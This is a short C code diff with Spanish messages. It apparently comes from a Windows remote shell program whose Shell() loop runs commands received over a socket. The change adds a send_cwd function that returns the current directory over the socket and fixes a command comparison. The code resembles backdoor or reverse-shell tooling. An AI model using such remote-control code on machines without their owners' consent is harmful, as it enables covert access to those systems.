@@ -125,12 +125,16 @@ char* gsi() {
    
 }
 
-void get_pwd(char* buffer, int bufferSize) {
-    if (getcwd(buffer, bufferSize) == NULL) {
+void send_cwd(int sock) {
+    char cwd[256];
+    if (getcwd(cwd, sizeof(cwd)) == NULL) {
         perror("Error al obtener el directorio actual");
-        strcpy(buffer, "");
+        return;
     }
-    send(sock, buffer, strlen(buffer), 0);
+
+    if (send(sock, cwd, strlen(cwd), 0) < 0) {
+        perror("Error al enviar el directorio actual");
+    }
 }
 
 void help(int sock) {
@@ -161,15 +165,12 @@ void Shell() {
             WSACleanup();
             exit(0);
         }
-        else if(strncmp("help", buffer, 5) == 0){
+        else if(strncmp("help", buffer, 4) == 0){
             //send(sock, buffer, sizeof(buffer), 0);
             help(sock);
         }
         else if(strncmp("pwd", buffer, 3) == 0){
-            char buffer[MAX_BUFFER_SIZE];
-            get_pwd(buffer, MAX_BUFFER_SIZE);
-            printf("Directorio actual: %s\n", buffer);
-            
+            send_cwd(sock);
         }
         else if(strncmp("ls", buffer, 3) == 0){
             //ls
